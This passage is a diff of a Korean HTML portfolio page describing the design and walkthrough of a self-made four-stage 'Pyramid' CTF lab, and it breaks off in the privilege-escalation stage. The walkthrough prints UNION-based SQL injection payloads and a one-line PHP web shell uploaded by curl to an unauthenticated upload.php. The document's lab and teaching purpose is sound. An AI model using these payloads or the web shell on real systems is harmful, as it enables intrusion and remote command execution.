@@ -2,214 +2,275 @@
 <html lang="ko">
   <head>
     <meta charset="utf-8" />
-    <title>Pyramid CTF Walkthrough</title>
+    <title>Pyramid CTF Portfolio</title>
     <link rel="stylesheet" href="index.css" />
   </head>
   <body>
     <header class="site-header">
       <div class="container">
-        <h1 class="site-title">Pyramid CTF Walkthrough</h1>
+        <h1 class="site-title">Pyramid CTF Portfolio</h1>
         <p class="site-subtitle">
-          SQL Injection · Web Exploitation · Crypto · Forensic · BoF
+          Design · Walkthrough · Web · Crypto · Forensic · Privilege Escalation
         </p>
       </div>
     </header>
 
     <main class="container">
-      <!-- 사이드 목차 -->
-      <aside class="toc">
-        <h2>Contents</h2>
-        <ol>
-          <li><a href="#pyramid1">Pyramid 1 – SQLi</a></li>
-          <li><a href="#pyramid2">Pyramid 2 – Split Fragment & Crypto</a></li>
-          <li><a href="#pyramid3">Pyramid 3 – Web Game & File Upload</a></li>
-          <li><a href="#pyramid4">Pyramid 4 – Linux Privilege Escalation</a></li>
-        </ol>
-      </aside>
+      <!-- 탭 헤더 -->
+      <div class="tabs">
+        <input type="radio" name="tabset" id="tab-process" checked />
+        <label for="tab-process" class="tab-label">제작 과정</label>
 
-      <section class="content">
-        <!-- Pyramid 1 -->
-        <article id="pyramid1" class="walkthrough-section">
-          <header>
-            <h2>Pyramid 1 – SQL Injection Walkthrough</h2>
-            <p class="meta">
-              목표: 취약한 검색 파라미터를 이용해 테이블·컬럼·데이터를 단계적으로 덤프하고,
-              최종적으로 다음 스테이지로 가는 힌트와 디렉터리 경로를 도출한다.
-            </p>
-          </header>
+        <input type="radio" name="tabset" id="tab-walkthrough" />
+        <label for="tab-walkthrough" class="tab-label">Walkthrough</label>
+      </div>
 
-          <section>
-            <h3>1. 서비스 식별 및 기본 SQLi 확인</h3>
-            <p>
-              지정된 Pyramid 서버 IP를 확인한 뒤, HTTP 서비스에 접속하여 검색 기능이 있는 페이지를 확인하였다.
-            </p>
-            <figure>
-              <img src="images/image001.jpg" alt="초기 웹 페이지 화면" />
-              <figcaption>초기 진입 페이지 화면</figcaption>
-            </figure>
+      <!-- 탭 콘텐츠 -->
+      <div class="tab-panels">
+        <!-- 제작 과정 탭 -->
+        <section class="tab-panel" id="panel-process">
+          <article class="walkthrough-section">
+            <header>
+              <h2>제작 과정 – Design & Infrastructure</h2>
+              <p class="meta">
+                Pyramid CTF 전체 문제 설계, 인프라 구성, 난이도 조절, 학습 포인트를 정리한 섹션이다.
+              </p>
+            </header>
 
-            <p>
-              검색 파라미터에 <code>' OR '1'='1</code> 형태의 가장 기초적인 SQLi 페이로드를 입력했을 때,
-              모든 행이 반환되는 동작을 통해 필터링이 거의 없고 쿼리가 직접 조작 가능함을 확인하였다.
-            </p>
-            <figure>
-              <img src="images/image002.jpg" alt="기본 SQLi 페이로드 동작 결과" />
-              <figcaption>기본 SQLi 페이로드로 전체 레코드 조회</figcaption>
-            </figure>
+            <section>
+              <h3>1. 시나리오 및 난이도 설계</h3>
+              <p>
+                피라미드 테마에 맞춰 단계별로 웹, SQL Injection, 크립토, 포렌식, 로컬 권한 상승을 자연스럽게 이어지는
+                스토리로 구성하였다. 각 단계는 독립적으로 학습 가능한 동시에, 이전 단계의 결과가 다음 단계의
+                진입 정보로 이어지도록 설계해 흐름을 이해하는 능력을 강조하였다.
+              </p>
+            </section>
 
-            <ul class="bullet-list">
-              <li>입력값이 필터링 없이 DB 쿼리에 직접 사용된다.</li>
-              <li>파라미터 <code>name</code>이 GET 방식으로 그대로 노출된다.</li>
-              <li>화면에 3개의 컬럼만 출력되지만, 실제 쿼리는 더 많은 컬럼을 포함할 수 있다.</li>
-              <li><code>SELECT</code>, <code>OR</code> 등의 키워드가 차단되지 않아 SQLi 취약점 존재가 확실하다.</li>
-            </ul>
-          </section>
+            <section>
+              <h3>2. 인프라 구성</h3>
+              <p>
+                각 스테이지는 개별 서비스로 구성하되, 동일한 내부 네트워크 상에 배치해 실제 기업 환경과 유사한 구조를
+                모사하였다. 웹 서버, DB, SSH 서비스, 이미지 리소스 서버 등을 컨테이너 단위로 모듈화하여
+                문제 운영과 복구가 용이하도록 구성하였다.
+              </p>
+            </section>
 
-          <section>
-            <h3>2. UNION 기반 테이블·컬럼 정보 수집</h3>
-            <p>
-              컬럼 개수를 맞춘 뒤 UNION SELECT를 활용하여 현재 데이터베이스의 테이블 이름을 추출하였다.
-            </p>
+            <section>
+              <h3>3. 보안 취약점 의도</h3>
+              <ul class="bullet-list">
+                <li>Stage 1: 필터링이 거의 없는 검색 파라미터를 통한 UNION 기반 SQL Injection.</li>
+                <li>Stage 2: 여러 위치에 분리된 fragment와 AES-128-CBC 복호화 과정을 통한 크립토 실습.</li>
+                <li>Stage 3: 파일 업로드 권한 검증 미흡과 디렉터리 브루트포싱을 활용한 웹 셸 업로드.</li>
+                <li>Stage 4: C 기반 BoF 성격의 취약 바이너리와 SSH를 통한 로컬 권한 상승 체인.</li>
+              </ul>
+            </section>
 
-            <pre class="code-block">
+            <section>
+              <h3>4. 학습 포인트 및 리포팅</h3>
+              <p>
+                각 단계별로 공격 관점뿐 아니라 방어·개선 방안을 정리해, 교육용 자료로 재사용 가능하도록 설계하였다.
+                최종적으로는 취약점 개요, 영향도, 재현 절차, 개선 방안을 포함한 리포트 형식으로 문서화하여
+                포트폴리오에 활용할 수 있도록 구성하였다.
+              </p>
+            </section>
+          </article>
+        </section>
+
+        <!-- Walkthrough 탭 -->
+        <section class="tab-panel" id="panel-walkthrough">
+          <aside class="toc">
+            <h2>Contents</h2>
+            <ol>
+              <li><a href="#pyramid1">Pyramid 1 – SQLi</a></li>
+              <li><a href="#pyramid2">Pyramid 2 – Split Fragment & Crypto</a></li>
+              <li><a href="#pyramid3">Pyramid 3 – Web Game & File Upload</a></li>
+              <li><a href="#pyramid4">Pyramid 4 – Linux Privilege Escalation</a></li>
+            </ol>
+          </aside>
+
+          <section class="content">
+            <!-- ==================== Pyramid 1 ==================== -->
+            <article id="pyramid1" class="walkthrough-section">
+              <header>
+                <h2>Pyramid 1 – SQL Injection Walkthrough</h2>
+                <p class="meta">
+                  목표: 취약한 검색 파라미터를 이용해 테이블·컬럼·데이터를 단계적으로 덤프하고,
+                  최종적으로 다음 스테이지로 가는 힌트와 디렉터리 경로를 도출한다.
+                </p>
+              </header>
+
+              <section>
+                <h3>1. 서비스 식별 및 기본 SQLi 확인</h3>
+                <p>
+                  지정된 Pyramid 서버 IP를 확인한 뒤, HTTP 서비스에 접속하여 검색 기능이 있는 페이지를 확인하였다.
+                </p>
+                <figure>
+                  <img src="images/image001.jpg" alt="초기 웹 페이지 화면" />
+                  <figcaption>초기 진입 페이지 화면</figcaption>
+                </figure>
+
+                <p>
+                  검색 파라미터에 <code>' OR '1'='1</code> 형태의 가장 기초적인 SQLi 페이로드를 입력했을 때,
+                  모든 행이 반환되는 동작을 통해 필터링이 거의 없고 쿼리가 직접 조작 가능함을 확인하였다.
+                </p>
+                <figure>
+                  <img src="images/image002.jpg" alt="기본 SQLi 페이로드 동작 결과" />
+                  <figcaption>기본 SQLi 페이로드로 전체 레코드 조회</figcaption>
+                </figure>
+
+                <ul class="bullet-list">
+                  <li>입력값이 필터링 없이 DB 쿼리에 직접 사용된다.</li>
+                  <li>파라미터 <code>name</code>이 GET 방식으로 그대로 노출된다.</li>
+                  <li>화면에 3개의 컬럼만 출력되지만, 실제 쿼리는 더 많은 컬럼을 포함할 수 있다.</li>
+                  <li><code>SELECT</code>, <code>OR</code> 등의 키워드가 차단되지 않아 SQLi 취약점 존재가 확실하다.</li>
+                </ul>
+              </section>
+
+              <section>
+                <h3>2. UNION 기반 테이블·컬럼 정보 수집</h3>
+                <p>
+                  컬럼 개수를 맞춘 뒤 UNION SELECT를 활용하여 현재 데이터베이스의 테이블 이름을 추출하였다.
+                </p>
+
+                <pre class="code-block">
 ' UNION SELECT 1, group_concat(table_name), 3
   FROM information_schema.tables
  WHERE table_schema = database() --
-            </pre>
+                </pre>
 
-            <figure>
-              <img src="images/image003.jpg" alt="테이블 이름 덤프 결과" />
-              <figcaption>두 번째 컬럼 위치에 테이블 목록 출력</figcaption>
-            </figure>
+                <figure>
+                  <img src="images/image003.jpg" alt="테이블 이름 덤프 결과" />
+                  <figcaption>두 번째 컬럼 위치에 테이블 목록 출력</figcaption>
+                </figure>
 
-            <p>
-              이후 식별한 대상 테이블(예: <code>pharaohs</code>)에 대해 컬럼 목록을 추출하고자 하였다.
-            </p>
+                <p>
+                  이후 식별한 대상 테이블(예: <code>pharaohs</code>)에 대해 컬럼 목록을 추출하고자 하였다.
+                </p>
 
-            <pre class="code-block">
+                <pre class="code-block">
 ' UNION SELECT 1, group_concat(column_name), 3
   FROM information_schema.columns
  WHERE table_name = 'pharaohs' --
-            </pre>
+                </pre>
 
-            <figure>
-              <img src="images/image004.jpg" alt="컬럼 이름 덤프 결과" />
-              <figcaption>테이블 컬럼 전체 목록 수집</figcaption>
-            </figure>
-          </section>
+                <figure>
+                  <img src="images/image004.jpg" alt="컬럼 이름 덤프 결과" />
+                  <figcaption>테이블 컬럼 전체 목록 수집</figcaption>
+                </figure>
+              </section>
 
-          <section>
-            <h3>3. 민감 정보 추출 및 ROT13 힌트 해석</h3>
-            <p>
-              최종적으로 <code>pharaohs</code> 테이블의 민감 컬럼(<code>secret_info</code>)을 대상으로 조건부 조회를 수행하여
-              다음 단계로 이어지는 힌트를 얻었다.
-            </p>
+              <section>
+                <h3>3. 민감 정보 추출 및 ROT13 힌트 해석</h3>
+                <p>
+                  최종적으로 <code>pharaohs</code> 테이블의 민감 컬럼(<code>secret_info</code>)을 대상으로 조건부 조회를 수행하여
+                  다음 단계로 이어지는 힌트를 얻었다.
+                </p>
 
-            <pre class="code-block">
+                <pre class="code-block">
 ' UNION SELECT 1, 2, secret_info
   FROM pharaohs
  WHERE id = 6 --
-            </pre>
+                </pre>
 
-            <figure>
-              <img src="images/image005.jpg" alt="secret_info 컬럼 조회 결과" />
-              <figcaption>secret_info 컬럼에서 최종 힌트 조회</figcaption>
-            </figure>
+                <figure>
+                  <img src="images/image005.jpg" alt="secret_info 컬럼 조회 결과" />
+                  <figcaption>secret_info 컬럼에서 최종 힌트 조회</figcaption>
+                </figure>
 
-            <p>
-              페이지 소스 주석에는 길고 난해한 문자열이 포함되어 있었고,
-              ROT13 디코딩 도구(예: rot13.com)를 사용해 해석한 결과,  
-              SSH 정보가 아닌 웹 디렉터리 경로와 흐름을 따라가라는 암시임을 파악하였다.
-            </p>
+                <p>
+                  페이지 소스 주석에는 길고 난해한 문자열이 포함되어 있었고,
+                  ROT13 디코딩 도구를 사용해 해석한 결과,
+                  SSH 정보가 아닌 웹 디렉터리 경로와 흐름을 따라가라는 암시임을 파악하였다.
+                </p>
 
-            <figure>
-              <img src="images/image007.jpg" alt="ROT13 디코딩 화면" />
-              <figcaption>ROT13 디코딩을 통한 텍스트 해석</figcaption>
-            </figure>
+                <figure>
+                  <img src="images/image007.jpg" alt="ROT13 디코딩 화면" />
+                  <figcaption>ROT13 디코딩을 통한 텍스트 해석</figcaption>
+                </figure>
 
-            <p>
-              메시지에 포함된 슬래시(<code>/</code>)와 특정 단어 조합을 통해 URL 패턴을 유추하고,
-              <code>http://pyramidIP/the_architect_of_the_Great_Pyramid</code> 형태의 경로가 다음 스테이지 진입점이라는 결론에 도달하였다.
-            </p>
+                <p>
+                  메시지에 포함된 슬래시(<code>/</code>)와 특정 단어 조합을 통해 URL 패턴을 유추하고,
+                  <code>http://pyramidIP/the_architect_of_the_Great_Pyramid</code> 형태의 경로가 다음 스테이지 진입점이라는 결론에 도달하였다.
+                </p>
 
-            <figure>
-              <img src="images/image008.png" alt="경로 힌트가 포함된 문자열" />
-              <figcaption>문자열 내부의 디렉터리 경로 힌트</figcaption>
-            </figure>
-          </section>
-        </article>
+                <figure>
+                  <img src="images/image008.png" alt="경로 힌트가 포함된 문자열" />
+                  <figcaption>문자열 내부의 디렉터리 경로 힌트</figcaption>
+                </figure>
+              </section>
+            </article>
 
-        <!-- Pyramid 2 -->
-        <article id="pyramid2" class="walkthrough-section">
-          <header>
-            <h2>Pyramid 2 – Split Fragment & Decryption</h2>
-            <p class="meta">
-              목표: 웹 리소스 곳곳에 흩어져 있는 fragment를 수집하고, 제공된 쉘 스크립트 로직을 따라
-              키 파생 및 AES 복호화를 수행하여 다음 단계 비밀번호를 얻는다.
-            </p>
-          </header>
+            <!-- ==================== Pyramid 2 ==================== -->
+            <article id="pyramid2" class="walkthrough-section">
+              <header>
+                <h2>Pyramid 2 – Split Fragment & Decryption</h2>
+                <p class="meta">
+                  목표: 웹 리소스 곳곳에 흩어져 있는 fragment를 수집하고, 제공된 쉘 스크립트 로직을 따라
+                  키 파생 및 AES 복호화를 수행하여 다음 단계 비밀번호를 얻는다.
+                </p>
+              </header>
 
-          <section>
-            <h3>1. Fragment 수집 (HTML, JS, 이미지 메타데이터)</h3>
-            <p>
-              <code>/the_architect_of_the_Great_Pyramid/</code>에 접속하면 fragment가 세 곳에 나뉘어 존재한다는 안내 문구와
-              위치에 대한 간단한 힌트를 확인할 수 있다.
-            </p>
+              <section>
+                <h3>1. Fragment 수집 (HTML, JS, 이미지 메타데이터)</h3>
+                <p>
+                  <code>/the_architect_of_the_Great_Pyramid/</code>에 접속하면 fragment가 세 곳에 나뉘어 존재한다는 안내 문구와
+                  위치에 대한 간단한 힌트를 확인할 수 있다.
+                </p>
 
-            <figure>
-              <img src="images/image010.jpg" alt="fragment 안내 페이지" />
-              <figcaption>세 개의 fragment와 위치에 대한 설명</figcaption>
-            </figure>
+                <figure>
+                  <img src="images/image010.jpg" alt="fragment 안내 페이지" />
+                  <figcaption>세 개의 fragment와 위치에 대한 설명</figcaption>
+                </figure>
 
-            <ul class="bullet-list">
-              <li>Fragment 1: 페이지 소스 내 주석에서 <code>Xv9A</code> 문자열 확인.</li>
-              <li>Fragment 2: <code>assets/script.js</code>에서 <code>MuS7</code>라는 hex 관련 힌트 확보.</li>
-              <li>Fragment 3: <code>assets/hint.png</code> 이미지 메타데이터의 Comment 필드에서 <code>z9Qp</code> 발견 (exiftool 사용).</li>
-            </ul>
+                <ul class="bullet-list">
+                  <li>Fragment 1: 페이지 소스 내 주석에서 <code>Xv9A</code> 문자열 확인.</li>
+                  <li>Fragment 2: <code>assets/script.js</code>에서 <code>MuS7</code>라는 hex 관련 힌트 확보.</li>
+                  <li>Fragment 3: <code>assets/hint.png</code> 이미지 메타데이터의 Comment 필드에서 <code>z9Qp</code> 발견.</li>
+                </ul>
 
-            <figure>
-              <img src="images/image014.jpg" alt="exiftool 메타데이터 결과" />
-              <figcaption>hint.png 메타데이터 Comment 필드의 fragment</figcaption>
-            </figure>
-          </section>
+                <figure>
+                  <img src="images/image014.jpg" alt="exiftool 메타데이터 결과" />
+                  <figcaption>hint.png 메타데이터 Comment 필드의 fragment</figcaption>
+                </figure>
+              </section>
 
-          <section>
-            <h3>2. Fragment 결합 및 키 파생</h3>
-            <p>
-              세 fragment를 지정된 순서대로 이어붙여 하나의 문자열로 만든 뒤,
-              페이지 하단에 안내된 쉘 스크립트 로직을 사용해 AES 키를 파생하였다.
-            </p>
+              <section>
+                <h3>2. Fragment 결합 및 키 파생</h3>
+                <p>
+                  세 fragment를 지정된 순서대로 이어붙여 하나의 문자열로 만든 뒤,
+                  페이지 하단에 안내된 쉘 스크립트 로직을 사용해 AES 키를 파생하였다.
+                </p>
 
-            <pre class="code-block">
+                <pre class="code-block">
 concat="Xv9AMuS7z9Qp"
 keyhex=$(echo -n "$concat" | openssl dgst -sha256 -binary | xxd -p -c 256 | cut -c1-32)
 echo "Derived key (hex, 16 bytes): $keyhex"
-            </pre>
+                </pre>
 
-            <figure>
-              <img src="images/image016.jpg" alt="키 파생 스크립트 안내" />
-              <figcaption>페이지 하단에 제공된 키 파생 쉘 스크립트</figcaption>
-            </figure>
+                <figure>
+                  <img src="images/image016.jpg" alt="키 파생 스크립트 안내" />
+                  <figcaption>페이지 하단에 제공된 키 파생 쉘 스크립트</figcaption>
+                </figure>
 
-            <p>
-              동시에 페이지 상에는 base64 인코딩된 암호문이 주어지며,
-              해당 값을 변수 <code>b64</code>로 사용하도록 가이드가 포함되어 있다.
-            </p>
-          </section>
+                <p>
+                  동시에 페이지 상에는 base64 인코딩된 암호문이 주어지며,
+                  해당 값을 <code>b64</code> 변수로 사용한다.
+                </p>
+              </section>
 
-          <section>
-            <h3>3. Base64 디코딩 및 AES-128-CBC 복호화</h3>
-            <p>
-              제공된 스크립트 흐름에 맞추어 payload를 단계적으로 처리하여 평문을 얻었다.
-            </p>
+              <section>
+                <h3>3. Base64 디코딩 및 AES-128-CBC 복호화</h3>
+                <p>
+                  제공된 스크립트 흐름에 맞추어 payload를 단계적으로 처리하여 평문을 얻었다.
+                </p>
 
-            <ol class="number-list">
-              <li><strong>base64 디코딩:</strong> <code>b64</code>를 디코딩하여 <code>/tmp/payload.bin</code>으로 저장.</li>
-              <li><strong>IV 추출:</strong> 파일의 처음 16바이트를 IV로 사용하고, 나머지 부분을 암호문으로 분리.</li>
-              <li><strong>AES 복호화:</strong> 파생된 키(<code>keyhex</code>)와 IV를 사용해 AES-128-CBC 모드로 복호화.</li>
-            </ol>
+                <ol class="number-list">
+                  <li><strong>base64 디코딩:</strong> <code>b64</code>를 디코딩하여 <code>/tmp/payload.bin</code>으로 저장.</li>
+                  <li><strong>IV 추출:</strong> 파일의 처음 16바이트를 IV로 사용하고, 나머지 부분을 암호문으로 분리.</li>
+                  <li><strong>AES 복호화:</strong> 파생된 키(<code>keyhex</code>)와 IV를 사용해 AES-128-CBC 모드로 복호화.</li>
+                </ol>
 
-            <pre class="code-block">
+                <pre class="code-block">
 echo -n "$b64" | base64 -d > /tmp/payload.bin
 
 ivhex=$(xxd -p -l 16 /tmp/payload.bin | tr -d '\n')
@@ -219,236 +280,227 @@ openssl enc -d -aes-128-cbc -in /tmp/cipher.bin \
   -K "$keyhex" -iv "$ivhex" -out /tmp/plain.txt 2>/tmp/openssl.err || true
 
 cat /tmp/plain.txt
-            </pre>
+                </pre>
 
-            <figure>
-              <img src="images/image023.png" alt="복호화 결과 화면" />
-              <figcaption>복호화된 평문에서 다음 단계 비밀번호 추출</figcaption>
-            </figure>
+                <figure>
+                  <img src="images/image023.png" alt="복호화 결과 화면" />
+                  <figcaption>복호화된 평문에서 다음 단계 비밀번호 추출</figcaption>
+                </figure>
+              </section>
+            </article>
 
-            <p>
-              최종 평문에서 <code>luckforyournext_!21!</code> 형태의 문자열을 확인했고,
-              이는 이후 웹 게임 단계 진입 시 사용하는 패스워드로 활용되었다.
-            </p>
-          </section>
-        </article>
+            <!-- ==================== Pyramid 3 ==================== -->
+            <article id="pyramid3" class="walkthrough-section">
+              <header>
+                <h2>Pyramid 3 – Web Game & File Upload Exploitation</h2>
+                <p class="meta">
+                  목표: 다단계 웹 페이지 내 숨겨진 힌트와 간단한 크립토를 통해 다음 경로를 찾고,
+                  파일 업로드 취약점을 이용해 웹 셸을 업로드하여 flag를 획득한다.
+                </p>
+              </header>
 
-        <!-- Pyramid 3 -->
-        <article id="pyramid3" class="walkthrough-section">
-          <header>
-            <h2>Pyramid 3 – Web Game & File Upload Exploitation</h2>
-            <p class="meta">
-              목표: 다단계 웹 페이지 내 숨겨진 힌트와 간단한 크립토를 통해 다음 경로를 찾고,
-              파일 업로드 취약점을 이용해 웹 셸을 업로드하여 flag를 획득한다.
-            </p>
-          </header>
+              <section>
+                <h3>1. game.php 진입 및 다중 페이지 플로우</h3>
+                <p>
+                  앞 단계에서 얻은 비밀번호 <code>luckforyournext_!21!</code>를 이용해
+                  <code>game.php</code>에 진입한다.
+                </p>
 
-          <section>
-            <h3>1. game.php 진입 및 다중 페이지 플로우</h3>
-            <p>
-              앞 단계에서 얻은 비밀번호 <code>luckforyournext_!21!</code>를 이용해
-              <code>game.php</code>에 진입한다.
-            </p>
+                <figure>
+                  <img src="images/image026.jpg" alt="game.php 진입 화면" />
+                  <figcaption>비밀번호 입력 후 game.php 진입</figcaption>
+                </figure>
 
-            <figure>
-              <img src="images/image026.jpg" alt="game.php 진입 화면" />
-              <figcaption>비밀번호 입력 후 game.php 진입</figcaption>
-            </figure>
+                <ul class="bullet-list">
+                  <li>
+                    첫 번째 이미지 → <code>mirro.php</code>: 미로 탈출 후 flag
+                    <code>uvrebtylcuvp</code> 획득 → ROT13 디코딩 → <code>hieroglyphic</code> 도출.
+                  </li>
+                  <li>
+                    두 번째 이미지 → <code>image.php</code>: 특정 영역 클릭 시 다음 페이지 이름
+                    <code>chamber</code>에 대한 모달 힌트 확인.
+                  </li>
+                </ul>
 
-            <ul class="bullet-list">
-              <li>
-                첫 번째 이미지 → <code>mirro.php</code>: 미로 탈출 후 flag
-                <code>uvrebtylcuvp</code> 획득 → ROT13 디코딩 → <code>hieroglyphic</code> 도출.
-              </li>
-              <li>
-                두 번째 이미지 → <code>image.php</code>: 특정 영역 클릭 시 다음 페이지 이름
-                <code>chamber</code>에 대한 모달 힌트 확인.
-              </li>
-            </ul>
+                <figure>
+                  <img src="images/image028.jpg" alt="미로 클리어 후 ROT13 전 flag" />
+                  <figcaption>미로 클리어 후 얻은 ROT13 인코딩 flag</figcaption>
+                </figure>
+              </section>
 
-            <figure>
-              <img src="images/image028.jpg" alt="미로 클리어 후 ROT13 전 flag" />
-              <figcaption>미로 클리어 후 얻은 ROT13 인코딩 flag</figcaption>
-            </figure>
-          </section>
+              <section>
+                <h3>2. 상형문자 해석 및 Tomb.php 유도</h3>
+                <p>
+                  <code>chamber.php</code>에 접속하여 앞서 얻은 비밀번호
+                  <code>hieroglyphic</code>를 입력하면, 화면에는 이집트 상형문자로 작성된 암호문이 나타난다.
+                </p>
 
-          <section>
-            <h3>2. 이집트 상형문자 해석 및 Tomb.php 유도</h3>
-            <p>
-              <code>chamber.php</code>에 접속하여 앞서 얻은 비밀번호
-              <code>hieroglyphic</code>를 입력하면, 화면에는 이집트 상형문자로 작성된 암호문이 나타난다.
-            </p>
+                <p>
+                  상형문자-알파벳 매핑 표를 참고해 해석한 결과 <code>artifact</code>라는 flag를 얻었고,
+                  특정 위치 클릭 시 다음 페이지 이름 <code>Tomb</code>에 대한 모달 힌트를 통해
+                  <code>Tomb.php</code>로의 이동을 유도한다.
+                </p>
 
-            <p>
-              상형문자-알파벳 매핑 표를 참고해 해석한 결과 <code>artifact</code>라는 flag를 얻었고,
-              특정 위치 클릭 시 다음 페이지 이름 <code>Tomb</code>에 대한 모달 힌트를 통해
-              <code>Tomb.php</code>로의 이동을 유도한다.
-            </p>
+                <figure>
+                  <img src="images/image033.jpg" alt="chamber.php 상형문자 화면" />
+                  <figcaption>이집트 상형문자를 해석해 artifact flag 획득</figcaption>
+                </figure>
+              </section>
 
-            <figure>
-              <img src="images/image033.jpg" alt="chamber.php 상형문자 화면" />
-              <figcaption>이집트 상형문자를 해석해 artifact flag 획득</figcaption>
-            </figure>
-          </section>
+              <section>
+                <h3>3. Tomb.php 파일 업로드 취약점 이용</h3>
+                <p>
+                  <code>Tomb.php</code>에서 <code>artifact</code>를 비밀번호로 입력하면,
+                  파일 업로드 UI가 나타나지만 직접 업로드 시에는 권한 부족으로 거부된다.
+                </p>
 
-          <section>
-            <h3>3. Tomb.php 파일 업로드 취약점 이용</h3>
-            <p>
-              <code>Tomb.php</code>에서 <code>artifact</code>를 비밀번호로 입력하면,
-              파일 업로드 UI가 나타나지만 직접 업로드 시에는 권한 부족으로 거부된다.
-            </p>
+                <p>
+                  그러나 서버 측 업로드 처리 스크립트 <code>upload.php</code>는 세션 또는 권한 검증 없이
+                  업로드를 허용하는 취약점이 존재하여, 직접 POST 요청을 보내면 임의 파일을 업로드할 수 있다.
+                </p>
 
-            <p>
-              그러나 서버 측 업로드 처리 스크립트 <code>upload.php</code>는 세션 또는 권한 검증 없이
-              업로드를 허용하는 취약점이 존재하여, 직접 POST 요청을 보내면 임의 파일을 업로드할 수 있다.
-            </p>
+                <figure>
+                  <img src="images/image036.jpg" alt="Tomb 업로드 페이지 화면" />
+                  <figcaption>사용자 인터페이스 상에서는 업로드가 제한된 모습</figcaption>
+                </figure>
 
-            <figure>
-              <img src="images/image036.jpg" alt="Tomb 업로드 페이지 화면" />
-              <figcaption>사용자 인터페이스 상에서는 업로드가 제한된 모습</figcaption>
-            </figure>
+                <p>
+                  다음과 같이 간단한 PHP 셸 파일을 준비하고, curl을 이용해 업로드를 수행하였다.
+                </p>
 
-            <p>
-              다음과 같이 간단한 PHP 셸 파일을 준비하고, curl을 이용해 업로드를 수행하였다.
-            </p>
-
-            <pre class="code-block">
-# 1) test.php 작성
+                <pre class="code-block">
 &lt;?php system($_GET['cmd']); ?&gt;
 
-# 2) curl을 사용해 upload.php로 직접 업로드 (서버는 예시 IP)
 curl -v -F "file=@./test.php;filename=shell.php" \
   http://192.168.16.15/upload.php
+                </pre>
 
-# 3) /uploads 디렉터리 접근
-#    (디렉터리는 dirb 등으로 브루트포싱 가능)
-            </pre>
+                <figure>
+                  <img src="images/image039.jpg" alt="/uploads 내 shell.php 확인" />
+                  <figcaption>/uploads 디렉터리에서 업로드된 shell.php 확인</figcaption>
+                </figure>
 
-            <figure>
-              <img src="images/image039.jpg" alt="/uploads 내 shell.php 확인" />
-              <figcaption>/uploads 디렉터리에서 업로드된 shell.php 확인</figcaption>
-            </figure>
+                <p>
+                  업로드된 <code>shell.php</code>에 접근해 명령 실행 또는 flag 출력을 확인할 수 있었고,
+                  이 flag는 다음 SSH 단계의 사용자 비밀번호로 사용되었다.
+                </p>
 
-            <p>
-              업로드된 <code>shell.php</code>에 접근해 명령 실행 또는 flag 출력을 확인할 수 있었고,
-              이 flag는 다음 SSH 단계의 사용자 비밀번호로 사용되었다.
-            </p>
+                <figure>
+                  <img src="images/image040.png" alt="웹 셸을 통한 flag 획득" />
+                  <figcaption>웹 셸 페이지에서 flag 확인</figcaption>
+                </figure>
+              </section>
+            </article>
 
-            <figure>
-              <img src="images/image040.png" alt="웹 셸을 통한 flag 획득" />
-              <figcaption>웹 셸 페이지에서 flag 확인</figcaption>
-            </figure>
-          </section>
-        </article>
+            <!-- ==================== Pyramid 4 ==================== -->
+            <article id="pyramid4" class="walkthrough-section">
+              <header>
+                <h2>Pyramid 4 – Linux Local Privilege Escalation</h2>
+                <p class="meta">
+                  목표: SSH를 통해 리눅스 환경에 진입한 뒤, C 기반 취약 바이너리와 파편화된 코드를 분석하여
+                  상위 계정으로 이동하고 최종 root flag를 획득한다.
+                </p>
+              </header>
 
-        <!-- Pyramid 4 -->
-        <article id="pyramid4" class="walkthrough-section">
-          <header>
-            <h2>Pyramid 4 – Linux Local Privilege Escalation</h2>
-            <p class="meta">
-              목표: SSH를 통해 리눅스 환경에 진입한 뒤, C 기반 BoF 취약한 바이너리와 파편화된 코드를 분석하여
-              상위 계정으로 이동하고 최종 root flag를 획득한다.
-            </p>
-          </header>
+              <section>
+                <h3>1. SSH 진입 및 초기 정찰</h3>
+                <p>
+                  앞 단계에서 얻은 정보를 바탕으로 <code>khufu</code> 계정으로 SSH 접속을 시도하였다.
+                </p>
 
-          <section>
-            <h3>1. SSH 진입 및 초기 정찰</h3>
-            <p>
-              앞 단계에서 얻은 정보를 바탕으로 <code>khufu</code> 계정으로 SSH 접속을 시도하였다.
-            </p>
+                <figure>
+                  <img src="images/image041.png" alt="khufu SSH 접속 화면" />
+                  <figcaption>khufu 계정 SSH 로그인</figcaption>
+                </figure>
 
-            <figure>
-              <img src="images/image041.png" alt="khufu SSH 접속 화면" />
-              <figcaption>khufu 계정 SSH 로그인</figcaption>
-            </figure>
+                <p>
+                  로그인 후 <code>ls -la</code>로 홈 디렉터리 구조를 확인한 결과,
+                  <code>papyrus</code>, <code>room/</code>, <code>rosetta_stone</code> 등의 파일과 디렉터리가 존재하는 것을 확인하였다.
+                </p>
 
-            <p>
-              로그인 후 <code>ls -la</code>로 홈 디렉터리 구조를 확인한 결과,
-              <code>papyrus</code>, <code>room/</code>, <code>rosetta_stone</code> 등의 파일과 디렉터리가 존재하는 것을 확인하였다.
-            </p>
+                <figure>
+                  <img src="images/image042.png" alt="khufu 홈 디렉터리 구조" />
+                  <figcaption>khufu 홈 디렉터리 내 주요 아티팩트</figcaption>
+                </figure>
+              </section>
 
-            <figure>
-              <img src="images/image042.png" alt="khufu 홈 디렉터리 구조" />
-              <figcaption>khufu 홈 디렉터리 내 주요 아티팩트</figcaption>
-            </figure>
-          </section>
+              <section>
+                <h3>2. room 디렉터리 분석 및 C 코드 조립</h3>
+                <p>
+                  <code>/home/khufu/room</code> 하위에는 <code>1</code>, <code>2</code>, <code>3</code>, <code>4</code> 등의 디렉터리가 존재하며,
+                  이 중 1, 2, 4 디렉터리에는 공통된 이름의 <code>offering</code> 파일이 포함되어 있었다.
+                </p>
 
-          <section>
-            <h3>2. room 디렉터리 분석 및 C 코드 조립</h3>
-            <p>
-              <code>/home/khufu/room</code> 하위에는 <code>1</code>, <code>2</code>, <code>3</code>, <code>4</code> 등의 디렉터리가 존재하며,
-              이 중 1, 2, 4 디렉터리에는 공통된 이름의 <code>offering</code> 파일이 포함되어 있었다.
-            </p>
+                <figure>
+                  <img src="images/image045.png" alt="room 디렉터리 구조" />
+                  <figcaption>room 디렉터리와 하위 디렉터리들</figcaption>
+                </figure>
 
-            <figure>
-              <img src="images/image045.png" alt="room 디렉터리 구조" />
-              <figcaption>room 디렉터리와 하위 디렉터리들</figcaption>
-            </figure>
+                <p>
+                  각 <code>offering</code> 파일에는 C 코드 일부가 담겨 있었고,
+                  이를 조합하면 <code>system()</code> 호출과 <code>strcpy(altar, offering)</code> 구문을 포함하는 하나의 C 프로그램이 완성되었다.
